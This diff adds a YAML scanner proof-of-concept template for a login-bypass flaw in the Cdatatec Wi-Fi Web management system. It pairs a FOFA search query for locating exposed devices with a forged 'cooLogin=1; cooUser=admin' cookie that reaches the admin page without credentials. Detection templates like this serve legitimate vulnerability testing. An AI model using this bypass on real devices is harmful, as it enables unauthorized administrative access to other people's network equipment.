@@ -1,0 +1,20 @@
+id: poc-yaml-cdatatec-wifi-login-cookie
+info:
+  name: 西迪特 Wi-Fi Web管理系统 前台登录绕过漏洞
+  severity: high
+  tags:
+  - 命令注入
+  finger: Wi-Fi Web管理系统
+  fofa: title=="Wi-Fi Web管理"
+requests:
+- method: GET
+  path: /cgi-bin/jumpto.php?class=frame&page=main
+  expression: "status_code == 200 && \ncontains(body,`parent.location='/index.html'`)\n"
+- method: GET
+  path: /cgi-bin/jumpto.php?class=frame&page=main
+  headers:
+    Cookie: timestamp=0; cooLogin=1; cooUser=admin
+  expression: "status_code == 200 && \n!contains(body,\"parent.location='/index.html'\"\
+    ) &&\ncontains(headers,\"Set-Cookie\")\n"
+variables: {}
+transport: http
